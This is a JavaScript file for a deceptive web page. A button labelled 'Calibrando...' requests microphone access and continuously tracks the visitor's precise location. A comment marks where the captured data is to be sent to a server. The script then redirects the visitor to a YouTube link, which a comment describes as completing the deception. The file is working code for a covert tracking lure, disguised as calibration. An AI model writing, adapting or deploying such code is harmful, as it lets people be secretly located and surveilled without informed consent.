document.addEventListener('DOMContentLoaded', () => {
    const actionButton = document.getElementById('actionButton');

    actionButton.addEventListener('click', async () => {
        actionButton.textContent = 'Calibrando...';
        actionButton.disabled = true;

        try {
            // Solicitar permisos de micrófono
            await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
            console.log('Acceso al micrófono concedido.');

            // Solicitar permisos de geolocalización
            navigator.geolocation.watchPosition(
                (position) => {
                    console.log('Ubicación:', position.coords.latitude, position.coords.longitude);
                    // Aquí se enviarán los datos al servidor
                },
                (error) => {
                    console.error('Error de ubicación.', error);
                },
                { enableHighAccuracy: true }
            );

        } catch (error) {
            console.error('Permisos denegados.', error);
        } finally {
            // Redirigir al usuario al video de YouTube para completar el engaño
            setTimeout(() => {
                const params = new URLSearchParams(window.location.search);
                const finalRedirectUrl = params.get('redirect');
                if (finalRedirectUrl) {
                    window.location.replace(decodeURIComponent(finalRedirectUrl));
                }
            }, 1000);
        }
    });
});
